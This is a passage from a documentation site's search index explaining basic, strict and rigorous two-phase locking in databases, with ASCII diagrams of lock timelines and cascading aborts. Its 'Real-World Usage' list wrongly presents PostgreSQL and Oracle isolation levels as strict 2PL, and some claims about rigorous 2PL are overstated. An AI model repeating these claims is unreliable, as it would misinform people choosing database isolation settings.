\u251c\u2500 GROWING \u2500\u2524\u2500\u2500\u2500\u2500 SHRINKING \u2500\u2500\u2500\u2500\u2524                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Cascading Abort Problem:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       BASIC 2PL - CASCADING ABORT PROBLEM               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 T1:                          T2:                        \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502 Lock(A)                                                 \u2502\n\u2502 Write A = 100                                           \u2502\n\u2502 Unlock(A) \u2713                                             \u2502\n\u2502 (Shrinking started)                                     \u2502\n\u2502                              Lock(A) \u2713                  \u2502\n\u2502                              Read A = 100               \u2502\n\u2502                              (uncommitted from T1!)     \u2502\n\u2502                              Use value...               \u2502\n\u2502 [ERROR occurs]                                          \u2502\n\u2502 ABORT! \u274c                                               \u2502\n\u2502                                                         \u2502\n\u2502                              Now T2 must ABORT too! \u274c  \u2502\n\u2502                              (Read dirty data from T1)  \u2502\n\u2502                                                         \u2502\n\u2502 CASCADING ABORT:                                        \u2502\n\u2502 \u2022 T1 aborts \u2192 T2 must abort                             \u2502\n\u2502 \u2022 T2 abort \u2192 T3 must abort (if T3 read T2's data)       \u2502\n\u2502 \u2022 T3 abort \u2192 T4 must abort...                           \u2502\n\u2502                                                         \u2502\n\u2502 Chain reaction of aborts! \ud83d\udca5                            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros and Cons:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          BASIC 2PL - ADVANTAGES &amp; DISADVANTAGES         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ADVANTAGES:                                             \u2502\n\u2502 \u2705 Guarantees serializability                           \u2502\n\u2502 \u2705 Maximum concurrency (early lock release)             \u2502\n\u2502 \u2705 Lower lock holding time                              \u2502\n\u2502 \u2705 Better resource utilization                          \u2502\n\u2502                                                         \u2502\n\u2502 DISADVANTAGES:                                          \u2502\n\u2502 \u274c Cascading aborts possible                            \u2502\n\u2502 \u274c Complex recovery needed                              \u2502\n\u2502 \u274c Dirty reads by other transactions                    \u2502\n\u2502 \u274c Rarely used in practice                              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#type-2-strict-2pl-most-common","title":"Type 2: Strict 2PL (Most Common)","text":"<p>Description:</p> <p>Strict 2PL is the most widely used variant in production database systems. It requires that all exclusive (write) locks be held until the transaction commits or aborts, while shared (read) locks can be released earlier during the shrinking phase.</p> <p>Rules:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             STRICT 2PL - RULES                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 GROWING PHASE:                                          \u2502\n\u2502 \u2022 Acquire locks as needed                               \u2502\n\u2502 \u2022 Upgrade locks (shared \u2192 exclusive)                    \u2502\n\u2502 \u2022 Cannot release any lock                               \u2502\n\u2502                                                         \u2502\n\u2502 SHRINKING PHASE:                                        \u2502\n\u2502 \u2022 Can release SHARED locks early                        \u2502\n\u2502 \u2022 EXCLUSIVE locks MUST be held until commit/abort       \u2502\n\u2502 \u2022 Cannot acquire new locks                              \u2502\n\u2502                                                         \u2502\n\u2502 COMMIT/ABORT:                                           \u2502\n\u2502 \u2022 ALL exclusive locks released atomically               \u2502\n\u2502 \u2022 Guarantees no dirty reads                             \u2502\n\u2502                                                         \u2502\n\u2502 KEY RULE:                                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 EXCLUSIVE LOCKS held until END           \u2502           \u2502\n\u2502 \u2502 SHARED LOCKS can be released early       \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Timeline Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          STRICT 2PL - TIMELINE                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Locks                                                  \u2502\n\u2502  Held                                                   \u2502\n\u2502   \u25b2                                                     \u2502\n\u2502   \u2502    LOCK                                             \u2502\n\u2502   \u2502   POINT                                             \u2502\n\u2502   \u2502      \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                        \u2502\n\u2502 3 \u2502     \u2571 \u2572                     \u2502                       \u2502\n\u2502   \u2502    \u2571   \u2572  \u2190 Exclusive locks \u2502                       \u2502\n\u2502 2 \u2502   \u25cf     \u25cf                   \u2502 held until commit     \u2502\n\u2502   \u2502  \u2571       \u2572                  \u2502                       \u2502\n\u2502 1 \u2502 \u25cf         \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf        \u2502                       \u2502\n\u2502   \u2502\u2571 \u2190 Shared  \u2572       \u2502        \u2502                       \u2502\n\u2502 0 \u25cf    locks    \u2572      \u2502        \u2502                       \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2572\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2192 Time               \u2502\n\u2502   BEGIN           \u2572  Released  COMMIT                   \u2502\n\u2502                    \u2572  early                             \u2502\n\u2502                     \u25cf                                   \u2502\n\u2502                  (Shared                                \u2502\n\u2502                   locks)                                \u2502\n\u2502                                                         \u2502\n\u2502   \u251c\u2500 GROWING \u2500\u2524\u2500\u2500\u2500\u2500 SHRINKING \u2500\u2500\u2500\u2500\u2524                    \u2502\n\u2502                                                         \u2502\n\u2502   Legend:                                               \u2502\n\u2502   \u2500\u2500\u2500\u2500 Exclusive locks (held until commit)              \u2502\n\u2502   \u2572\u2571\u2572  Shared locks (can be released early)             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>No Cascading Aborts:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       STRICT 2PL - NO CASCADING ABORTS                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 T1:                          T2:                        \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502 Lock-X(A)                                               \u2502\n\u2502 Write A = 100                                           \u2502\n\u2502 (Still holds lock!) \ud83d\udd12                                  \u2502\n\u2502                              Lock-X(A)                  \u2502\n\u2502                              \u2192 WAITS for T1             \u2502\n\u2502 Continue work...                                        \u2502\n\u2502 [ERROR occurs]                                          \u2502\n\u2502 ABORT! \u274c                                               \u2502\n\u2502 Unlock(A)                                               \u2502\n\u2502 (T1 aborted, A reverted)                                \u2502\n\u2502                                                         \u2502\n\u2502                              Lock-X(A) \u2713 (now acquired) \u2502\n\u2502                              Read A = [original value]  \u2502\n\u2502                              \u2713 No dirty read!           \u2502\n\u2502                              Continue normally...       \u2502\n\u2502                                                         \u2502\n\u2502 RESULT:                                                 \u2502\n\u2502 \u2022 T2 never saw uncommitted data                         \u2502\n\u2502 \u2022 No cascading abort needed!                            \u2502\n\u2502 \u2022 Clean isolation                                       \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Real-World Usage:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       STRICT 2PL - DATABASE USAGE                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Used by:                                                \u2502\n\u2502 \u2022 MySQL/InnoDB (REPEATABLE READ, SERIALIZABLE)          \u2502\n\u2502 \u2022 PostgreSQL (REPEATABLE READ, SERIALIZABLE)            \u2502\n\u2502 \u2022 Oracle Database (SERIALIZABLE isolation)              \u2502\n\u2502 \u2022 SQL Server (SERIALIZABLE isolation)                   \u2502\n\u2502 \u2022 DB2                                                   \u2502\n\u2502                                                         \u2502\n\u2502 Why preferred:                                          \u2502\n\u2502 \u2705 Prevents dirty reads                                 \u2502\n\u2502 \u2705 Prevents cascading aborts                            \u2502\n\u2502 \u2705 Simpler recovery                                     \u2502\n\u2502 \u2705 Good concurrency (shared locks released early)       \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros and Cons:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         STRICT 2PL - ADVANTAGES &amp; DISADVANTAGES         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ADVANTAGES:                                             \u2502\n\u2502 \u2705 Guarantees serializability                           \u2502\n\u2502 \u2705 Prevents cascading aborts                            \u2502\n\u2502 \u2705 No dirty reads                                       \u2502\n\u2502 \u2705 Simpler recovery mechanism                           \u2502\n\u2502 \u2705 Industry standard                                    \u2502\n\u2502 \u2705 Good balance: concurrency vs safety                  \u2502\n\u2502                                                         \u2502\n\u2502 DISADVANTAGES:                                          \u2502\n\u2502 \u274c Longer lock holding time (exclusive locks)           \u2502\n\u2502 \u274c Lower concurrency than basic 2PL                     \u2502\n\u2502 \u274c Deadlocks still possible                             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#type-3-rigorous-2pl-strongest","title":"Type 3: Rigorous 2PL (Strongest)","text":"<p>Description:</p> <p>Rigorous 2PL is the strictest variant. It requires that ALL locks (both shared and exclusive) be held until the transaction commits or aborts. No locks are released during the shrinking phase until the very end.</p> <p>Rules:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           RIGOROUS 2PL - RULES                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 GROWING PHASE:                                          \u2502\n\u2502 \u2022 Acquire locks as needed                               \u2502\n\u2502 \u2022 Upgrade locks (shared \u2192 exclusive)                    \u2502\n\u2502 \u2022 Cannot release any lock                               \u2502\n\u2502                                                         \u2502\n\u2502 \"SHRINKING\" PHASE (actually no shrinking!):             \u2502\n\u2502 \u2022 Hold ALL locks                                        \u2502\n\u2502 \u2022 No locks released                                     \u2502\n\u2502 \u2022 Cannot acquire new locks                              \u2502\n\u2502                                                         \u2502\n\u2502 COMMIT/ABORT:                                           \u2502\n\u2502 \u2022 ALL locks released atomically at once                 \u2502\n\u2502 \u2022 Guaranteed strictest isolation                        \u2502\n\u2502                                                         \u2502\n\u2502 KEY RULE:                                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 ALL LOCKS held until COMMIT/ABORT        \u2502           \u2502\n\u2502 \u2502 No early release whatsoever              \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Timeline Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         RIGOROUS 2PL - TIMELINE                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Locks                                                  \u2502\n\u2502  Held                                                   \u2502\n\u2502   \u25b2                                                     \u2502\n\u2502   \u2502    LOCK                                             \u2502\n\u2502   \u2502   POINT                                             \u2502\n\u2502   \u2502      \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                       \u2502\n\u2502 3 \u2502     \u2571 \u2572                     \u2502                       \u2502\n\u2502   \u2502    \u2571   \u2572                    \u2502                       \u2502\n\u2502 2 \u2502   \u2571     \u2572                   \u2502 ALL locks held        \u2502\n\u2502   \u2502  \u2571       \u2572                  \u2502 until commit!         \u2502\n\u2502 1 \u2502 \u2571         \u2572                 \u2502                       \u2502\n\u2502   \u2502\u2571           \u2572                \u2502                       \u2502\n\u2502 0 \u25cf             \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                       \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Time              \u2502\n\u2502   BEGIN        \u2502               COMMIT                   \u2502\n\u2502                \u2502              (All locks                \u2502\n\u2502          Lock point           released                  \u2502\n\u2502         (max locks)           atomically)               \u2502\n\u2502                                                         \u2502\n\u2502   \u251c\u2500 GROWING \u2500\u2524\u2500\u2500\u2500 HOLD ALL \u2500\u2500\u2500\u2500\u2524                      \u2502\n\u2502                  (No shrinking!)                        \u2502\n\u2502                                                         \u2502\n\u2502   Note: Technically no \"shrinking\" phase                \u2502\n\u2502         Locks held at plateau until end                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Characteristics:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         RIGOROUS 2PL - CHARACTERISTICS                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ISOLATION LEVEL:                                        \u2502\n\u2502 \u2022 Strongest possible isolation                          \u2502\n\u2502 \u2022 Equivalent to pure serial execution                   \u2502\n\u2502 \u2022 No interference whatsoever                            \u2502\n\u2502                                                         \u2502\n\u2502 LOCK MANAGEMENT:                                        \u2502\n\u2502 \u2022 Simplest to implement                                 \u2502\n\u2502 \u2022 No need to track which locks to release               \u2502\n\u2502 \u2022 Release all at commit/abort                           \u2502\n\u2502                                                         \u2502\n\u2502 SERIALIZABILITY:                                        \u2502\n\u2502 \u2022 Guarantees strict serializability                     \u2502\n\u2502 \u2022 Commit order = serialization order                    \u2502\n\u2502 \u2022 No dirty reads, no cascading aborts                   \u2502\n\u2502                                                         \u2502\n\u2502 CONCURRENCY:                                            \u2502\n\u2502 \u2022 Lowest concurrency of all 2PL types                   \u2502\n\u2502 \u2022 Maximum blocking                                      \u2502\n\u2502 \u2022 Longest lock hold times                               \u2502\n\u2502                                                         